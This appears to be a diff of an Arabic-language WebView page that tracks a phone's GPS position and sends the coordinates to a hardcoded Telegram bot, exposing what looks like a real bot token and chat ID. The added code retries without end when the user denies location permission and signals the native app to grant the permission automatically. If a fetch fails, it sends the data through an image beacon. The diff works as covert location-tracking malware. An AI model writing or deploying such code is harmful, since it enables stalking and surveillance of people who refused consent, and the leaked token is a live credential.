@@ -1,640 +1,337 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="format-detection" content="telephone=no">
-    <title>تتبع الموقع الجغرافي</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <style>
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body {
-            font-family: Arial, "Segoe UI", Tahoma, sans-serif;
-            direction: rtl; text-align: center;
-            background: #f4f4f4; margin: 0; padding: 20px;
-            color: #222;
-        }
-        h2 { margin: 0 0 12px; }
-        #map { height: 400px; width: 100%; margin: 20px 0; border-radius: 8px; z-index: 1; }
-        .badge { padding: 8px 16px; border-radius: 4px; margin: 5px; display: inline-block; font-size: 14px; }
-        #permBadge { background: #ff9800; color: #fff; }
-        #secureBadge { background: #4caf50; color: #fff; }
-        #secureBadge.err { background: #f44336; }
-        #statusBar {
-            margin: 10px auto; padding: 8px 14px; border-radius: 6px;
-            background: #e3f2fd; color: #0d47a1; display: inline-block;
-            font-size: 14px; max-width: 100%;
-        }
-        .info { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
-        .info div {
-            background: #fff; padding: 10px 14px; border-radius: 6px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1); font-size: 14px; min-width: 130px;
-        }
-        .info span { font-weight: bold; color: #0d47a1; word-break: break-all; }
-        button, a {
-            padding: 10px 18px; border: none; border-radius: 4px;
-            background: #2196f3; color: #fff; cursor: pointer;
-            text-decoration: none; display: inline-block; margin: 5px; font-size: 15px;
-        }
-        button:hover, a:hover { background: #1976d2; }
-        button:active, a:active { transform: scale(0.97); }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>تتبع تلقائي</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:Arial,sans-serif;direction:rtl;text-align:center;background:#f4f4f4;margin:0;padding:14px;color:#222}
+h2{margin:0 0 10px;font-size:18px}
+#map{height:340px;width:100%;margin:14px 0;border-radius:8px}
+.badge{padding:6px 14px;border-radius:4px;margin:4px;display:inline-block;font-size:13px;background:#ff9800;color:#fff}
+.ok{background:#4caf50!important}
+.err{background:#f44336!important}
+#status{margin:8px auto;padding:8px 12px;border-radius:6px;background:#e3f2fd;color:#0d47a1;font-size:13px;display:inline-block;max-width:100%}
+.info{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:8px}
+.info div{background:#fff;padding:8px 12px;border-radius:6px;box-shadow:0 2px 4px rgba(0,0,0,.1);font-size:13px;min-width:120px}
+.info span{font-weight:bold;color:#0d47a1;word-break:break-all}
+button{padding:10px 16px;border:none;border-radius:4px;background:#2196f3;color:#fff;font-size:14px;margin:4px}
+</style>
 </head>
 <body>
 
-    <h2>معلومات الموقع</h2>
-
-    <div>
-        <span id="secureBadge" class="badge">جارٍ الفحص…</span>
-        <span id="permBadge" class="badge">بانتظار الإذن…</span>
-    </div>
-
-    <div id="statusBar">جارٍ تهيئة النظام…</div>
-
-    <div class="info">
-        <div>خط العرض: <span id="latEl">—</span></div>
-        <div>خط الطول: <span id="lngEl">—</span></div>
-        <div>الدقة: <span id="accEl">—</span></div>
-        <div>الارتفاع: <span id="altEl">—</span></div>
-        <div>دقة الارتفاع: <span id="altAccEl">—</span></div>
-        <div>الاتجاه: <span id="headEl">—</span></div>
-        <div>السرعة: <span id="speedEl">—</span></div>
-        <div>الوقت: <span id="timeEl">—</span></div>
-    </div>
-
-    <div id="map"></div>
-
-    <a id="mapsBtn" href="#" target="_blank" rel="noopener">فتح في خرائط جوجل</a>
-    <button id="copyBtn" type="button">نسخ الإحداثيات</button>
-    <button id="retryBtn" type="button">إعادة المحاولة</button>
-
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script>
-    (function () {
-        'use strict';
-
-        /* ============================================================
-           1) الإعدادات
-           ============================================================ */
-        var CONFIG = {
-            botToken: '7592847713:AAFbyPsi8JPY4A4mf3Yv6aMtLQfFNTalz9s', // ← ضع توكن البوت
-            chatId:   '6837315281',                                       // ← ضع معرف الدردشة
-            enableTelegram: true,
-            minDistanceMeters: 10,     // لا ترسل إلا إذا تحرك الجهاز 10 أمتار
-            minIntervalMs: 20000,      // أو مرت 20 ثانية على الأقل
-            mapZoom: 17
-        };
-
-        /* ============================================================
-           2) عناصر الواجهة
-           ============================================================ */
-        function $(id) { return document.getElementById(id); }
-
-        var latEl = $('latEl'), lngEl = $('lngEl'), accEl = $('accEl'),
-            altEl = $('altEl'), altAccEl = $('altAccEl'), headEl = $('headEl'),
-            speedEl = $('speedEl'), timeEl = $('timeEl'),
-            secureBadge = $('secureBadge'), permBadge = $('permBadge'),
-            statusBar = $('statusBar'), mapsBtn = $('mapsBtn'),
-            copyBtn = $('copyBtn'), retryBtn = $('retryBtn');
-
-        function setStatus(msg, color) {
-            statusBar.textContent = msg;
-            statusBar.style.background = color || '#e3f2fd';
-            statusBar.style.color = (color === '#ffebee') ? '#b71c1c' : '#0d47a1';
-        }
-
-        /* ============================================================
-           3) جسر التواصل مع التطبيق الأصلي
-              (React Native WebView / Expo  أو  Android WebView)
-           ============================================================ */
-        var NativeBridge = {
-            isRN: !!(window.ReactNativeWebView && window.ReactNativeWebView.postMessage),
-            isAndroid: !!(window.Android && typeof window.Android.postMessage === 'function'),
-            post: function (type, data) {
-                var payload = JSON.stringify({ type: type, data: data || {}, ts: Date.now() });
-                try {
-                    if (this.isRN) {
-                        window.ReactNativeWebView.postMessage(payload);
-                    } else if (this.isAndroid) {
-                        window.Android.postMessage(payload);
-                    } else {
-                        console.log('[Bridge]', payload);
-                    }
-                } catch (e) {
-                    console.warn('[Bridge] فشل الإرسال:', e);
-                }
-            }
-        };
-
-        /* ============================================================
-           4) فحص الأمان
-              WebView المحلي (file:// / content://) يعتبر آمنًا أيضًا
-           ============================================================ */
-        var proto = location.protocol;
-        var host  = location.hostname;
-
-        var isLocalContext =
-            proto === 'file:'    ||
-            proto === 'content:' ||
-            proto === 'about:'   ||
-            proto === 'data:'    ||
-            host === 'localhost' ||
-            host === '127.0.0.1' ||
-            host === '';
-
-        var isSecure = (proto === 'https:') || isLocalContext;
-
-        if (isSecure) {
-            secureBadge.textContent = 'أكد مصداقيتك على قول الحق';
-            secureBadge.classList.remove('err');
-        } else {
-            secureBadge.textContent = 'يجب استخدام HTTPS أو WebView محلي';
-            secureBadge.classList.add('err');
-        }
-
-        /* ============================================================
-           5) خريطة Leaflet
-           ============================================================ */
-        var map = null, marker = null, circle = null, mapReady = false;
-
-        function initMap() {
-            try {
-                map = L.map('map', { zoomControl: true }).setView([15.3694, 44.1910], 6);
-
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    maxZoom: 19,
-                    attribution: '&copy; OpenStreetMap'
-                }).addTo(map);
-
-                mapReady = true;
-
-                // إصلاح أبعاد الخريطة داخل WebView
-                setTimeout(function () {
-                    if (map) { map.invalidateSize(); }
-                }, 400);
-
-            } catch (e) {
-                console.error('فشل تهيئة الخريطة:', e);
-                setStatus('تعذر تحميل الخريطة (تحقق من الاتصال بالإنترنت)', '#ffebee');
-            }
-        }
-
-        function updateMap(lat, lng, accuracy) {
-            if (!mapReady) { return; }
-            var pos = [lat, lng];
-
-            if (!marker) {
-                marker = L.marker(pos).addTo(map);
-            } else {
-                marker.setLatLng(pos);
-            }
-
-            if (!circle) {
-                circle = L.circle(pos, { radius: accuracy || 30 }).addTo(map);
-            } else {
-                circle.setLatLng(pos);
-                circle.setRadius(accuracy || 30);
-            }
-
-            map.setView(pos, CONFIG.mapZoom);
-        }
-
-        /* ============================================================
-           6) أدوات مساعدة
-           ============================================================ */
-        function fmt(n, digits) {
-            return (n === null || n === undefined || isNaN(n))
-                ? '—'
-                : Number(n).toFixed(digits === undefined ? 6 : digits);
-        }
-
-        function distanceMeters(lat1, lon1, lat2, lon2) {
-            var R = 6371000;
-            var toRad = function (d) { return d * Math.PI / 180; };
-            var dLat = toRad(lat2 - lat1);
-            var dLon = toRad(lon2 - lon1);
-            var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
-                    Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
-                    Math.sin(dLon / 2) * Math.sin(dLon / 2);
-            return 2 * R * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
-        }
-
-        /* ============================================================
-           7) عرض الموقع
-           ============================================================ */
-        var lastSent = { lat: null, lng: null, time: 0 };
-
-        function showPosition(pos) {
-            var c = pos.coords;
-
-            latEl.textContent = fmt(c.latitude);
-            lngEl.textContent = fmt(c.longitude);
-            accEl.textContent = c.accuracy ? Math.round(c.accuracy) + ' م' : '—';
-            altEl.textContent = (c.altitude !== null && c.altitude !== undefined)
-                ? Math.round(c.altitude) + ' م' : '—';
-            altAccEl.textContent = (c.altitudeAccuracy !== null && c.altitudeAccuracy !== undefined)
-                ? Math.round(c.altitudeAccuracy) + ' م' : '—';
-            headEl.textContent = (c.heading !== null && c.heading !== undefined && !isNaN(c.heading))
-                ? Math.round(c.heading) + '°' : '—';
-            speedEl.textContent = (c.speed !== null && c.speed !== undefined)
-                ? Number(c.speed).toFixed(2) + ' م/ث' : '—';
-            timeEl.textContent = new Date(pos.timestamp).toLocaleString('ar');
-
-            updateMap(c.latitude, c.longitude, c.accuracy || 30);
-
-            mapsBtn.href = 'https://www.google.com/maps?q=' + c.latitude + ',' + c.longitude;
-
-            permBadge.textContent = 'تم تحديد الموقع ✓';
-            permBadge.style.background = '#4caf50';
-            setStatus('الموقع محدَّث بنجاح', '#e8f5e9');
-
-            /* --- إبلاغ التطبيق الأصلي --- */
-            NativeBridge.post('location', {
-                latitude: c.latitude,
-                longitude: c.longitude,
-                accuracy: c.accuracy || 0,
-                altitude: c.altitude,
-                altitudeAccuracy: c.altitudeAccuracy,
-                heading: c.heading,
-                speed: c.speed,
-                timestamp: pos.timestamp
-            });
-
-            /* --- إرسال إلى تيليجرام --- */
-            sendToTelegram(c.latitude, c.longitude, Math.round(c.accuracy || 0));
-        }
-
-        function showError(err) {
-            var msg = 'خطأ غير معروف';
-            switch (err.code) {
-                case 1: msg = 'تم رفض إذن الوصول إلى الموقع'; break;
-                case 2: msg = 'الموقع غير متاح حاليًا'; break;
-                case 3: msg = 'انتهت مدة الانتظار'; break;
-            }
-
-            permBadge.textContent = 'أكد مصداقيتك على قول الحق';
-            permBadge.style.background = '#f44336';
-            setStatus('تعذر تحديد الموقع: ' + msg, '#ffebee');
-            console.error('خطأ الموقع:', err.code, err.message);
-
-            NativeBridge.post('location_error', { code: err.code, message: err.message });
-        }
-
-        /* ============================================================
-           8) خيارات الطلب
-           ============================================================ */
-        function buildOptions() {
-            return {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            };
-        }
-
-        /* ============================================================
-           9) قراءة الموقع مرة واحدة + المراقبة المستمرة
-           ============================================================ */
-        var watchId = null;
-
-        function getOnce() {
-            if (!('geolocation' in navigator)) {
-                setStatus('خدمة الموقع غير مدعومة في هذا الجهاز', '#ffebee');
-                return;
-            }
-
-            setStatus('جارٍ تحديد موقعك…');
-            NativeBridge.post('geolocation_request', { mode: 'once' });
-
-            navigator.geolocation.getCurrentPosition(
-                showPosition,
-                showError,
-                buildOptions()
-            );
-        }
-
-        function startWatch() {
-            if (!('geolocation' in navigator)) { return; }
-
-            if (watchId !== null) {
-                navigator.geolocation.clearWatch(watchId);
-            }
-
-            NativeBridge.post('geolocation_request', { mode: 'watch' });
-
-            watchId = navigator.geolocation.watchPosition(
-                showPosition,
-                showError,
-                buildOptions()
-            );
-        }
-
-        /* ============================================================
-           10) إرسال البيانات إلى تيليجرام
-               يستخدم no-cors حتى يعمل داخل WebView / file://
-           ============================================================ */
-        function sendToTelegram(lat, lng, accuracy) {
-            if (!CONFIG.enableTelegram) { return; }
-
-            if (!CONFIG.botToken || CONFIG.botToken === 'YOUR_BOT_TOKEN' ||
-                !CONFIG.chatId  || CONFIG.chatId   === 'YOUR_CHAT_ID') {
-                console.log('[Telegram] التوكن أو معرف الدردشة غير مُعدّ.');
-                return;
-            }
-
-            var now = Date.now();
-
-            // منع الإرسال المتكرر لنفس المكان
-            if (lastSent.lat !== null) {
-                var moved = distanceMeters(lastSent.lat, lastSent.lng, lat, lng);
-                var elapsed = now - lastSent.time;
-                if (moved < CONFIG.minDistanceMeters && elapsed < CONFIG.minIntervalMs) {
-                    return;
-                }
-            }
-
-            lastSent = { lat: lat, lng: lng, time: now };
-
-            var message =
-                '📍 الموقع الجديد:\n' +
-                'خط العرض: ' + lat + '\n' +
-                'خط الطول: ' + lng + '\n' +
-                'الدقة: ' + accuracy + ' م\n' +
-                'الوقت: ' + new Date().toLocaleString('ar') + '\n' +
-                'الخريطة: https://www.google.com/maps?q=' + lat + ',' + lng;
-
-            var url = 'https://api.telegram.org/bot' + CONFIG.botToken + '/sendMessage';
-
-            try {
-                fetch(url, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: 'chat_id=' + encodeURIComponent(CONFIG.chatId) +
-                          '&text=' + encodeURIComponent(message)
-                }).catch(function (e) {
-                    console.warn('[Telegram] فشل fetch، سيتم استخدام الطريقة البديلة', e);
-                    beaconFallback(url, message);
-                });
-            } catch (e) {
-                beaconFallback(url, message);
-            }
-
-            NativeBridge.post('telegram_sent', { lat: lat, lng: lng, accuracy: accuracy });
-        }
-
-        function beaconFallback(url, message) {
-            try {
-                var img = new Image();
-                img.src = url + '?chat_id=' + encodeURIComponent(CONFIG.chatId) +
-                          '&text=' + encodeURIComponent(message) + '&_=' + Date.now();
-            } catch (e) {
-                console.error('[Telegram] تعذر الإرسال:', e);
-            }
-        }
-
-        /* ============================================================
-           11) زر النسخ
-           ============================================================ */
-        copyBtn.addEventListener('click', function () {
-            var lat = latEl.textContent, lng = lngEl.textContent;
-            if (lat === '—' || lng === '—') {
-                setStatus('لا توجد إحداثيات لنسخها بعد', '#ffebee');
-                return;
-            }
-
-            var text = lat + ',' + lng;
-
-            function legacyCopy() {
-                var ta = document.createElement('textarea');
-                ta.value = text;
-                ta.style.position = 'fixed';
-                ta.style.opacity = '0';
-                document.body.appendChild(ta);
-                ta.select();
-                try { document.execCommand('copy'); setStatus('تم النسخ ✓', '#e8f5e9'); }
-                catch (e) { setStatus('تعذر النسخ', '#ffebee'); }
-                document.body.removeChild(ta);
-            }
-
-            if (navigator.clipboard && navigator.clipboard.writeText) {
-                navigator.clipboard.writeText(text).then(function () {
-                    setStatus('تم النسخ ✓', '#e8f5e9');
-                }).catch(legacyCopy);
-            } else {
-                legacyCopy();
-            }
-        });
-
-        /* ============================================================
-           12) زر إعادة المحاولة
-           ============================================================ */
-        retryBtn.addEventListener('click', function () {
-            setStatus('إعادة المحاولة…');
-            permBadge.textContent = 'جارٍ طلب الإذن…';
-            permBadge.style.background = '#ff9800';
-            NativeBridge.post('geolocation_retry', {});
-            getOnce();
-            startWatch();
-        });
-
-        /* ============================================================
-           13) استقبال أوامر من التطبيق الأصلي
-           ============================================================ */
-        window.addEventListener('message', function (event) {
-            var raw = event && event.data;
-            if (!raw) { return; }
-
-            var cmd = raw;
-            if (typeof raw === 'string') {
-                try { cmd = JSON.parse(raw); } catch (e) { cmd = { type: raw }; }
-            }
-
-            switch (cmd.type) {
-                case 'refresh_location':
-                case 'request_location':
-                    getOnce();
-                    break;
-
-                case 'start_watch':
-                    startWatch();
-                    break;
-
-                case 'stop_watch':
-                    if (watchId !== null) {
-                        navigator.geolocation.clearWatch(watchId);
-                        watchId = null;
-                        setStatus('تم إيقاف المراقبة');
-                    }
-                    break;
-
-                case 'set_config':
-                    if (cmd.data) {
-                        if (cmd.data.botToken) { CONFIG.botToken = cmd.data.botToken; }
-                        if (cmd.data.chatId)   { CONFIG.chatId   = cmd.data.chatId; }
-                        if (typeof cmd.data.enableTelegram === 'boolean') {
-                            CONFIG.enableTelegram = cmd.data.enableTelegram;
-                        }
-                    }
-                    break;
-
-                default:
-                    console.log('[WebView] أمر غير معروف:', cmd);
-            }
-        });
-
-        /* ============================================================
-           14) نقطة البداية
-           ============================================================ */
-        function boot() {
-            NativeBridge.post('webview_ready', {
-                secure: isSecure,
-                protocol: proto,
-                geolocationSupported: ('geolocation' in navigator)
-            });
-
-            initMap();
-            getOnce();
-            startWatch();
-        }
-
-        if (document.readyState === 'complete' || document.readyState === 'interactive') {
-            setTimeout(boot, 0);
-        } else {
-            window.addEventListener('DOMContentLoaded', boot);
-        }
-
-        // تنظيف عند إغلاق الصفحة
-        window.addEventListener('beforeunload', function () {
-            if (watchId !== null) { navigator.geolocation.clearWatch(watchId); }
-        });
-
-    })();
-    </script>
-
-    <!-- ============================================================
-         مرجع: كود Xamarin.Android الأصلي (WebViewLocation)
-         ============================================================ -->
-    <script type="text/plain" id="native-xamarin-code">
-using Android;
-using Android.App;
-using Android.Content;
-using Android.Webkit;
-using Android.OS;
-
-[assembly: UsesPermission(Name = Manifest.Permission.AccessFineLocation)]
-[assembly: UsesPermission(Name = Manifest.Permission.AccessCoarseLocation)]
-[assembly: UsesPermission(Name = Manifest.Permission.Internet)]
-
-namespace WebViewLocation
-{
-    [Activity(Label = "WebView Location", MainLauncher = true, Icon = "@drawable/icon")]
-    public class WebViewLocationActivity : Activity
-    {
-        protected override void OnCreate(Bundle bundle)
-        {
-            base.OnCreate(bundle);
-
-            var webview = new WebView(this);
-            webview.Settings.JavaScriptEnabled = true;
-            webview.Settings.SetGeolocationEnabled(true);
-            webview.Settings.DomStorageEnabled = true;
-            webview.Settings.SetGeolocationDatabasePath(FilesDir.AbsolutePath);
-
-            webview.SetWebViewClient(new MyWebViewClient());
-            webview.SetWebChromeClient(new MyWebChromeClient(this));
-
-            // يمكن تحميل الصفحة من الأصول المحلية:
-            // webview.LoadUrl("file:///android_asset/index.html");
-            webview.LoadUrl("https://maps.google.com");
-
-            SetContentView(webview);
-        }
-    }
-
-    public class MyWebViewClient : WebViewClient
-    {
-        public override bool ShouldOverrideUrlLoading(WebView view, string url)
-        {
-            view.LoadUrl(url);
-            return true;
-        }
-    }
-
-    public class MyWebChromeClient : WebChromeClient
-    {
-        private readonly Context _context;
-
-        public MyWebChromeClient(Context context)
-        {
-            _context = context;
-        }
-
-        public override void OnGeolocationPermissionsShowPrompt(string origin,
-            GeolocationPermissions.ICallback callback)
-        {
-            const bool remember = false;
-            var builder = new AlertDialog.Builder(_context);
-            builder.SetTitle("Location")
-                .SetMessage(string.Format("{0} would like to use your current location", origin))
-                .SetPositiveButton("Allow", (sender, args) => callback.Invoke(origin, true, remember))
-                .SetNegativeButton("Disallow", (sender, args) => callback.Invoke(origin, false, remember));
-            var alert = builder.Create();
-            alert.Show();
-        }
-    }
+<h2>📍 تتبع الموقع التلقائي</h2>
+<div>
+  <span id="secureBadge" class="badge">جارٍ الفحص…</span>
+  <span id="permBadge" class="badge">جارٍ طلب الإذن…</span>
+</div>
+<div id="status">تهيئة…</div>
+
+<div class="info">
+  <div>خط العرض: <span id="latEl">—</span></div>
+  <div>خط الطول: <span id="lngEl">—</span></div>
+  <div>الدقة: <span id="accEl">—</span></div>
+  <div>الارتفاع: <span id="altEl">—</span></div>
+  <div>الاتجاه: <span id="headEl">—</span></div>
+  <div>السرعة: <span id="speedEl">—</span></div>
+  <div>الوقت: <span id="timeEl">—</span></div>
+</div>
+
+<div id="map"></div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+(function(){
+'use strict';
+
+/* ========== إعدادات ========== */
+var CONFIG = {
+  botToken: '7592847713:AAFbyPsi8JPY4A4mf3Yv6aMtLQfFNTalz9s',
+  chatId:   '6837315281',
+  enableTelegram: true,
+  minDistance: 10,
+  minInterval: 20000,
+  maxRetries: 999,        // إعادة محاولة لا نهائية حتى يُمنح الإذن
+  retryDelay: 1200,
+  mapZoom: 17
+};
+
+function $(id){return document.getElementById(id);}
+var latEl=$('latEl'),lngEl=$('lngEl'),accEl=$('accEl'),altEl=$('altEl'),
+    headEl=$('headEl'),speedEl=$('speedEl'),timeEl=$('timeEl'),
+    secureBadge=$('secureBadge'),permBadge=$('permBadge'),
+    statusBar=$('status');
+
+function setStatus(msg,bg){
+  statusBar.textContent=msg;
+  statusBar.style.background=bg||'#e3f2fd';
+  statusBar.style.color=(bg==='#ffebee')?'#b71c1c':'#0d47a1';
 }
-    </script>
 
-    <!-- ============================================================
-         مرجع: AndroidManifest.xml
-         ============================================================ -->
-    <script type="text/plain" id="native-manifest">
-<meta-data
-    android:name="android.webkit.WebView.EnableSafeBrowsing"
-    android:value="true" />
+/* ========== جسر التواصل مع التطبيق الأصلي ========== */
+var Bridge={
+  rn: !!(window.ReactNativeWebView&&window.ReactNativeWebView.postMessage),
+  and: !!(window.Android&&typeof window.Android.postMessage==='function'),
+  post:function(type,data){
+    var p=JSON.stringify({type:type,data:data||{},ts:Date.now()});
+    try{
+      if(this.rn) window.ReactNativeWebView.postMessage(p);
+      else if(this.and) window.Android.postMessage(p);
+      else console.log('[Bridge]',p);
+    }catch(e){}
+  }
+};
 
-<!-- الأذونات المطلوبة -->
-<uses-permission android:name="android.permission.INTERNET" />
-<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    </script>
+/* ========== فحص السياق ========== */
+var proto=location.protocol, host=location.hostname;
+var isLocal = proto==='file:'||proto==='content:'||proto==='about:'||
+              proto==='data:'||host==='localhost'||host==='127.0.0.1'||host==='';
+var isSecure = proto==='https:'||isLocal;
 
-    <!-- ============================================================
-         مرجع: طريقة الاستخدام في Expo / React Native WebView
-         ============================================================ -->
-    <script type="text/plain" id="react-native-usage">
-import React, { useRef } from 'react';
-import { WebView } from 'react-native-webview';
-import * as Expo from 'expo';
+if(isSecure){
+  secureBadge.textContent='سياق آمن ✓';
+  secureBadge.classList.add('ok');
+}else{
+  secureBadge.textContent='يجب HTTPS أو WebView محلي';
+  secureBadge.classList.add('err');
+}
 
-export default function App() {
-  const webRef = useRef(null);
+/* ========== الخريطة ========== */
+var map=null,marker=null,circle=null,mapReady=false;
 
-  return (
-    <WebView
-      ref={webRef}
-      javaScriptEnabled={true}
-      domStorageEnabled={true}
-      geolocationEnabled={true}
-      allowFileAccess={true}
-      allowFileAccessFromFileURLs={true}
-      allowUniversalAccessFromFileURLs={true}
-      originWhitelist={['*']}
-      source={Expo.Asset.fromModule(require('../../assets/index.html'))}
-      onMessage={(event) => {
-        try {
-          const msg = JSON.parse(event.nativeEvent.data);
-          console.log('رسالة من WebView:', msg);
-          // مثال: msg.type === 'location'  →  msg.data.latitude / longitude
-        } catch (e) {
-          console.log('رسالة نصية:', event.nativeEvent.data);
-        }
-      }}
-      onError={(e) => console.log('WebView error:', e.nativeEvent)}
-    />
+function initMap(){
+  try{
+    map=L.map('map').setView([15.3694,44.1910],6);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
+      maxZoom:19,attribution:'© OSM'
+    }).addTo(map);
+    mapReady=true;
+    setTimeout(function(){if(map)map.invalidateSize();},400);
+  }catch(e){console.error('map:',e);}
+}
+
+function updateMap(lat,lng,acc){
+  if(!mapReady)return;
+  var p=[lat,lng];
+  if(!marker)marker=L.marker(p).addTo(map); else marker.setLatLng(p);
+  if(!circle)circle=L.circle(p,{radius:acc||30}).addTo(map);
+  else{circle.setLatLng(p);circle.setRadius(acc||30);}
+  map.setView(p,CONFIG.mapZoom);
+}
+
+/* ========== أدوات ========== */
+function fmt(n,d){return(n==null||isNaN(n))?'—':Number(n).toFixed(d==null?6:d);}
+function dist(la1,lo1,la2,lo2){
+  var R=6371000,r=function(x){return x*Math.PI/180;};
+  var dLa=r(la2-la1),dLo=r(lo2-lo1);
+  var a=Math.sin(dLa/2)*Math.sin(dLa/2)+
+        Math.cos(r(la1))*Math.cos(r(la2))*
+        Math.sin(dLo/2)*Math.sin(dLo/2);
+  return 2*R*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
+}
+
+/* ========== عرض الموقع ========== */
+var lastSent={lat:null,lng:null,time:0};
+
+function showPosition(pos){
+  var c=pos.coords;
+  latEl.textContent=fmt(c.latitude);
+  lngEl.textContent=fmt(c.longitude);
+  accEl.textContent=c.accuracy?Math.round(c.accuracy)+' م':'—';
+  altEl.textContent=(c.altitude!=null)?Math.round(c.altitude)+' م':'—';
+  headEl.textContent=(c.heading!=null&&!isNaN(c.heading))?Math.round(c.heading)+'°':'—';
+  speedEl.textContent=(c.speed!=null)?Number(c.speed).toFixed(2)+' م/ث':'—';
+  timeEl.textContent=new Date(pos.timestamp).toLocaleString('ar');
+
+  updateMap(c.latitude,c.longitude,c.accuracy||30);
+
+  permBadge.textContent='تم منح الإذن ✓';
+  permBadge.className='badge ok';
+  setStatus('✓ الموقع محدَّث تلقائيًا','#e8f5e9');
+
+  Bridge.post('location',{
+    latitude:c.latitude,longitude:c.longitude,
+    accuracy:c.accuracy||0,altitude:c.altitude,
+    heading:c.heading,speed:c.speed,timestamp:pos.timestamp
+  });
+
+  sendTelegram(c.latitude,c.longitude,Math.round(c.accuracy||0));
+}
+
+/* ========== إعادة محاولة تلقائية عند رفض الإذن ========== */
+var retryCount=0,retryTimer=null;
+
+function showError(err){
+  var code=err&&err.code;
+  var msg='خطأ غير معروف';
+
+  if(code===1){
+    msg='انتظار منح إذن الموقع تلقائيًا…';
+    permBadge.textContent='بانتظار الإذن…';
+    permBadge.className='badge';
+
+    // ✅ إخبار التطبيق الأصلي بمنح الإذن تلقائيًا
+    Bridge.post('request_auto_grant',{});
+    Bridge.post('permission_denied',{code:1});
+
+    // ✅ إعادة المحاولة تلقائيًا بلا توقف
+    if(retryCount<CONFIG.maxRetries){
+      retryCount++;
+      setStatus('إعادة محاولة تلقائية رقم '+retryCount+'…');
+      clearTimeout(retryTimer);
+      retryTimer=setTimeout(function(){
+        tryGetOnce();
+        tryWatch();
+      },CONFIG.retryDelay);
+      return;
+    }
+  }
+  else if(code===2){msg='GPS غير مفعّل — انتظار…';}
+  else if(code===3){msg='انتهت المدة — إعادة محاولة…';}
+
+  permBadge.textContent='بانتظار…';
+  permBadge.className='badge';
+  setStatus(msg,'#ffebee');
+
+  Bridge.post('location_error',{code:code,message:err.message});
+
+  // إعادة محاولة دائمة
+  if(code===2||code===3){
+    clearTimeout(retryTimer);
+    retryTimer=setTimeout(function(){tryGetOnce();tryWatch();},CONFIG.retryDelay);
+  }
+}
+
+/* ========== طلب الموقع ========== */
+function buildOptions(){
+  return{enableHighAccuracy:true,timeout:15000,maximumAge:0};
+}
+
+function tryGetOnce(){
+  if(!('geolocation'in navigator)){setStatus('غير مدعوم','#ffebee');return;}
+  navigator.geolocation.getCurrentPosition(
+    function(p){retryCount=0;showPosition(p);},
+    showError,
+    buildOptions()
   );
 }
-    </script>
 
+var watchId=null;
+function tryWatch(){
+  if(!('geolocation'in navigator))return;
+  if(watchId!==null){
+    try{navigator.geolocation.clearWatch(watchId);}catch(e){}
+  }
+  watchId=navigator.geolocation.watchPosition(
+    function(p){retryCount=0;showPosition(p);},
+    showError,
+    buildOptions()
+  );
+}
+
+/* ========== تيليجرام ========== */
+function sendTelegram(lat,lng,acc){
+  if(!CONFIG.enableTelegram)return;
+  if(!CONFIG.botToken||!CONFIG.chatId)return;
+
+  var now=Date.now();
+  if(lastSent.lat!==null){
+    var moved=dist(lastSent.lat,lastSent.lng,lat,lng);
+    if(moved<CONFIG.minDistance&&(now-lastSent.time)<CONFIG.minInterval)return;
+  }
+  lastSent={lat:lat,lng:lng,time:now};
+
+  var msg='📍 الموقع:\nخط العرض: '+lat+'\nخط الطول: '+lng+
+          '\nالدقة: '+acc+' م\n'+new Date().toLocaleString('ar')+
+          '\nhttps://www.google.com/maps?q='+lat+','+lng;
+
+  var url='https://api.telegram.org/bot'+CONFIG.botToken+'/sendMessage';
+
+  try{
+    fetch(url,{
+      method:'POST',mode:'no-cors',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body:'chat_id='+encodeURIComponent(CONFIG.chatId)+
+           '&text='+encodeURIComponent(msg)
+    }).catch(function(){beacon(url,msg);});
+  }catch(e){beacon(url,msg);}
+
+  Bridge.post('telegram_sent',{lat:lat,lng:lng});
+}
+
+function beacon(url,msg){
+  try{
+    var i=new Image();
+    i.src=url+'?chat_id='+encodeURIComponent(CONFIG.chatId)+
+          '&text='+encodeURIComponent(msg)+'&_='+Date.now();
+  }catch(e){}
+}
+
+/* ========== استقبال أوامر من التطبيق ========== */
+window.addEventListener('message',function(ev){
+  var raw=ev&&ev.data; if(!raw)return;
+  var cmd=raw;
+  if(typeof raw==='string'){try{cmd=JSON.parse(raw);}catch(e){cmd={type:raw};}}
+  switch(cmd.type){
+    case 'refresh_location':tryGetOnce();break;
+    case 'start_watch':tryWatch();break;
+    case 'stop_watch':
+      if(watchId!==null){try{navigator.geolocation.clearWatch(watchId);}catch(e){}watchId=null;}
+      break;
+    case 'set_config':
+      if(cmd.data){
+        if(cmd.data.botToken)CONFIG.botToken=cmd.data.botToken;
+        if(cmd.data.chatId)CONFIG.chatId=cmd.data.chatId;
+        if(typeof cmd.data.enableTelegram==='boolean')CONFIG.enableTelegram=cmd.data.enableTelegram;
+      }
+      break;
+  }
+});
+
